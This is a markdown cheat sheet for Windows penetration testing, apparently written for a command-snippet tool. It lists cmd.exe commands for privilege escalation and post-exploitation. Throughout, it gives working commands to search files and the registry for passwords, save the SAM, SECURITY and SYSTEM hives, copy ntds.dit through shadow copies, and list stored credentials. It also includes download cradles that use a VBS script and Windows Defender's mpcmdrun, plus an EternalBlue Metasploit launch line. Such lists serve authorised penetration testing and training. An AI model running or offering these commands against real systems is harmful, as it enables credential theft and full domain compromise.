# cmd.exe

#plateform/windows #target/local #cat/PRIVESC


## find passwords
```
findstr /si 'password' *.txt *.xml *.docx
```

## find passwords - group policy preference (ms14-025)
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

## dns request for DC
```
nslookup -type=any <userdnsdomain>.
```

## show lsa cached credentials value
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## register query word password (1)
```
reg query HKLM /f password /t REG_SZ /s
```

## register query word password (2)
```
reg query HKCU /f password /t REG_SZ /s
```

## register query extract SAM

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named reg can be used to export them.

```
reg save HKLM\SAM 'C:\Windows\Temp\sam.save'
reg save HKLM\SECURITY 'C:\Windows\Temp\security.save'
reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
```

## create shadow copy
```
wmic shadowcopy call create Volume='C:\'
```

## list shadow copy
```
vssadmin list shadows
```


## check permission (1)
```
accesschk.exe /accepteula -dqv "<file>"
```

## check permission (2)
```
cacls "<file>"
```

## find weak folder permission
```
accesschk.exe -uwdqs Users <c>:\
```

## find weak file permission
```
accesschk.exe -uwqs Users <c>:\
```

% windows, download

## VBS download file script
#cat/ATTACK/FILE_TRANSFERT
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
```


## run as over user
#cat/PRIVESC
```
runas /user:<domain_fqdn>\<user> cmd.exe
```

## infos on a Administrator and retrieve SID
```powershell
[wmi] "Win32_userAccount.Domain='<computer_name>',Name='Administrator'"
```


## List credentials in credential manager
#cat/POSTEXPLOIT/CREDS_RECOVER
```
cmdkey /list
```

% windows, dir

## list hidden files
```
dir /a:h <path>
```

## Recursive list
```
dir /s /b
```

% windows, ntds.dit
## dump ntds.dit (Windows >= 2008 server) - method 1
```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
## dump ntds.dit (Windows >= 2008 server) - method 2
```
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
## dump ntds.dit (Windows <= 2003 server)
```
net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\temp
```

% windows, file, download
## windows download file with windows defender
```
"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe" -DownloadFile -url <url> -path <result_file>
```

## windows download file with windows defender
```
mpcmdrun.exe -DownloadFile -url <url> -path <result_file>
```

% windows, active directory, dns

## find AD IP - show domain name and dns
```
nmcli dev show <interface>
```


% windows, cve
## windows eternal blue - smb - ms17-010
```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
```

= interface: eth0
